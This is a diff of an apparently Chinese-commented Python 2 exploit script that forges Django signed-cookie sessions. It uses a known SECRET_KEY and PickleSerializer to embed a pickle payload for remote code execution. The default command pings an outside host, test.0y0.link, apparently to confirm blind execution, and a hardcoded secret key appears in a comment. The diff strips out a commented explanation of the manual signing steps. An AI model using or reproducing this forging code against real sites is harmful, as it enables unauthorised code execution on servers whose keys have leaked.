@@ -40,21 +40,9 @@ def session_gen(SECRET_KEY,command = 'ping -n 3 test.0y0.link || ping -c test.0y
 
     #SECRET_KEY = '1bb8)i&dl9c5=npkp248gl&aji7^x6izh3!itsmb6&yl!fak&f'
     SECRET_KEY = SECRET_KEY
-
     sess = signing.dumps(Run(), key = SECRET_KEY,serializer=PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
     #生成的恶意session
     print sess
-
-
-    '''
-    salt='django.contrib.sessions.backends.signed_cookies'
-    sess = pickle.dumps(Run())
-    sess = signing.b64_encode(sess)#通过跟踪signing.dumps函数可以知道pickle.dumps后的数据还经过了如下处理。
-    sess = signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(sess)
-    print sess
-    #这里生成的session也是可以成功利用的，这样写只是为了理解signing.dumps。
-    '''
-
     session = 'sessionid={0}'.format(sess)
     return session
 
